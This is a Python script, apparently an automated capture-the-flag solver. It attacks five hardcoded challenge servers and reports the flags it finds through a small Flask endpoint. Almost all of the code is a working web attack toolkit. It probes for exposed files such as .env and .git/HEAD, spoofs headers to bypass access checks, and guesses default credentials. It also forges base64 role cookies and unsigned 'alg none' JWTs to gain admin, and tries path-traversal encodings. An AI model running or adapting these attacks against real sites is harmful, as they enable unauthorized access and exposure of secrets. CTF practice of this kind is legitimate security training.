
#!/usr/bin/env python3
import base64
import json
import os
import re
import threading
import time

import requests
from flask import Flask, request, jsonify

# -----------------------------
# Config
# -----------------------------
TARGETS = {
    "challenge1": "http://40.65.179.25:3001",
    "challenge2": "http://40.65.179.25:3002",
    "challenge3": "http://40.65.179.25:3003",
    "challenge4": "http://40.65.179.25:3004",
    "challenge5": "http://40.65.179.25:3005",
}
TIMEOUT = 8
USER_AGENT = "ChaseTheFlag-AutoSolver/1.1"

# Global store for discovered flags
FLAGS = {k: "" for k in TARGETS.keys()}

# Common helpers
def http_get(url, **kwargs):
    headers = kwargs.pop("headers", {})
    headers.setdefault("User-Agent", USER_AGENT)
    try:
        r = requests.get(url, headers=headers, timeout=TIMEOUT, **kwargs)
        return r
    except Exception:
        return None

def http_post(url, data=None, json_body=None, **kwargs):
    headers = kwargs.pop("headers", {})
    headers.setdefault("User-Agent", USER_AGENT)
    try:
        if json_body is not None:
            r = requests.post(url, json=json_body, headers=headers, timeout=TIMEOUT, **kwargs)
        else:
            r = requests.post(url, data=data, headers=headers, timeout=TIMEOUT, **kwargs)
        return r
    except Exception:
        return None

def find_flag(text):
    if not text:
        return None
    patterns = [
        r"FLAG\{[^}]+\}",
        r"flag\{[^}]+\}",
        r"ctf\{[^}]+\}",
        r"chase_the_flag\{[^}]+\}",
        r"ubshack\{[^}]+\}",
        r"hack\{[^}]+\}",
    ]
    for pat in patterns:
        m = re.search(pat, text, flags=re.IGNORECASE | re.DOTALL)
        if m:
            return m.group(0)
    return None

def try_common_discovery(base):
    urls = [
        "/", "/index", "/index.html", "/home", "/robots.txt", "/.well-known/security.txt",
        "/.git/HEAD", "/.env", "/readme", "/readme.txt", "/README", "/README.md",
        "/admin", "/login", "/debug", "/config", "/server-status", "/hidden", "/secret",
        "/protected",
        "/assets/app.js", "/static/app.js", "/js/app.js", "/bundle.js", "/main.js",
    ]
    results = {}
    for p in urls:
        r = http_get(base + p)
        if r is not None:
            results[p] = (r.status_code, r.headers, r.text[:5000] if r.text else "")
    return results

def try_view_source_and_comments(base):
    r = http_get(base + "/")
    if not r:
        return None
    blob = (r.text or "")

    comments = re.findall(r"<!--(.*?)-->", blob, flags=re.DOTALL)
    if comments:
        for c in comments:
            f = find_flag(c)
            if f:
                return f

    js_paths = re.findall(r'<script[^>]+src=["\']([^"\']+\.js)["\']', blob, flags=re.I)
    tried = set()
    for jp in js_paths:
        if jp.startswith("http"):
            url = jp
        else:
            if not jp.startswith("/"):
                url = base + "/" + jp
            else:
                url = base + jp
        if url in tried:
            continue
        tried.add(url)
        rj = http_get(url)
        if rj and rj.text:
            f = find_flag(rj.text)
            if f:
                return f
            paths = re.findall(r'["\'](/[-a-zA-Z0-9_./]+)["\']', rj.text)
            for p in paths:
                rr = http_get(base + p)
                if rr and rr.text:
                    ff = find_flag(rr.text)
                    if ff:
                        return ff
    return None

def try_header_bypass(base):
    hdr_templates = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Original-URL": "/protected"},
        {"X-Rewrite-URL": "/protected"},
        {"X-Forwarded-Host": "localhost"},
        {"Forwarded": "for=127.0.0.1;host=localhost"},
        {"CF-Connecting-IP": "127.0.0.1"},
    ]
    for hdr in hdr_templates:
        r = http_get(base + "/protected", headers=hdr)
        if r and r.text:
            f = find_flag(r.text)
            if f:
                return f
    r = http_get(base + "/protected", headers={"Host": "localhost"})
    if r and r.text:
        f = find_flag(r.text)
        if f:
            return f
    return None

def try_method_override(base):
    headers_list = [
        {"X-HTTP-Method-Override": "GET"},
        {"X-HTTP-Method-Override": "POST"},
        {"X-Method-Override": "GET"},
    ]
    for headers in headers_list:
        r = http_post(base + "/protected", data={}, headers=headers)
        if r and r.text:
            f = find_flag(r.text)
            if f: return f
    return None

def try_simple_auth(base):
    creds = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("user", "user"),
        ("test", "test"),
    ]
    for u,p in creds:
        r = http_post(base + "/login", data={"username": u, "password": p})
        if r is None:
            continue
        cookies = r.cookies.get_dict()
        for k,v in cookies.items():
            try:
                dec = base64.b64decode(v + "===").decode("utf-8", errors="ignore")
                f = find_flag(dec)
                if f: return f
                if '{"' in dec and '}' in dec and 'role' in dec:
                    try:
                        j = json.loads(dec)
                        j['role'] = 'admin'
                        new_cookie = base64.b64encode(json.dumps(j).encode()).decode()
                        r2 = http_get(base + "/protected", headers={"Cookie": f"{k}={new_cookie}"})
                        if r2 and r2.text:
                            ff = find_flag(r2.text)
                            if ff: return ff
                    except Exception:
                        pass
            except Exception:
                pass
        r2 = http_get(base + "/protected", cookies=r.cookies.get_dict())
        if r2 and r2.text:
            f = find_flag(r2.text)
            if f: return f
    return None

def try_jwt_weakness(base):
    probes = ["/", "/login", "/auth", "/session"]
    token = None
    tok_name = None
    for p in probes:
        r = http_get(base + p)
        if not r:
            continue
        for k,v in r.cookies.get_dict().items():
            if len(v.split(".")) == 3:
                token = v
                tok_name = k
                break
        if token:
            break
    if not token:
        return None
    try:
        header_b64, payload_b64, sig = token.split(".")
        def b64url_decode(x):
            import base64
            pad = "=" * (-len(x) % 4)
            return base64.urlsafe_b64decode(x + pad)

        header = json.loads(b64url_decode(header_b64).decode("utf-8", errors="ignore"))
        payload = json.loads(b64url_decode(payload_b64).decode("utf-8", errors="ignore"))
        payload["role"] = "admin"
        header["alg"] = "none"

        def b64url_encode(raw):
            import base64
            return base64.urlsafe_b64encode(raw).decode().rstrip("=")

        new_header = b64url_encode(json.dumps(header, separators=(",",":")).encode())
        new_payload = b64url_encode(json.dumps(payload, separators=(",",":")).encode())
        none_jwt = f"{new_header}.{new_payload}."
        r = http_get(base + "/protected", headers={"Cookie": f"{tok_name}={none_jwt}"})
        if r and r.text:
            f = find_flag(r.text)
            if f:
                return f
    except Exception:
        pass
    return None

def try_param_tricks(base):
    params = [
        {"admin": "true"}, {"isAdmin": "1"}, {"debug": "1"}, {"bypass": "1"}, {"key": "admin"},
        {"access": "internal"}, {"role": "admin"}
    ]
    for param in params:
        r = http_get(base + "/protected", params=param)
        if r and r.text:
            f = find_flag(r.text)
            if f: return f
    return None

def try_path_confusion(base):
    variants = [
        "/..%2fprotected",
        "/%2e%2e/protected",
        "/protected%2f..%2f",
        "/;///protected",
        "/protected/.",
        "/%2fprotected",
    ]
    for v in variants:
        r = http_get(base + v)
        if r and r.text:
            f = find_flag(r.text)
            if f: return f
    return None

def try_all(base):
    disc = try_common_discovery(base)
    for (path,(code,headers,text)) in disc.items():
        f = find_flag(text)
        if f:
            return f

    f = try_view_source_and_comments(base)
    if f: return f

    f = try_header_bypass(base)
    if f: return f

    f = try_simple_auth(base)
    if f: return f

    f = try_method_override(base)
    if f: return f

    f = try_jwt_weakness(base)
    if f: return f

    f = try_param_tricks(base)
    if f: return f

    f = try_path_confusion(base)
    if f: return f

    return None

def solve_all():
    for name, base in TARGETS.items():
        try:
            flag = try_all(base)
            if flag:
                FLAGS[name] = flag
        except Exception:
            pass

from flask import Flask
app = Flask(__name__)

@app.route("/chasetheflag", methods=["POST"])
def chasetheflag():
    try:
        solve_all()
    except Exception:
        pass
    return jsonify({
        "challenge1": FLAGS["challenge1"],
        "challenge2": FLAGS["challenge2"],
        "challenge3": FLAGS["challenge3"],
        "challenge4": FLAGS["challenge4"],
        "challenge5": FLAGS["challenge5"],
    })

@app.route("/healthz")
def healthz():
    return "ok"

if __name__ == "__main__":
    # One quick pre-scan
    try:
        solve_all()
    except Exception:
        pass
    port = int(os.environ.get("PORT", "8080"))
    app.run(host="0.0.0.0", port=port)
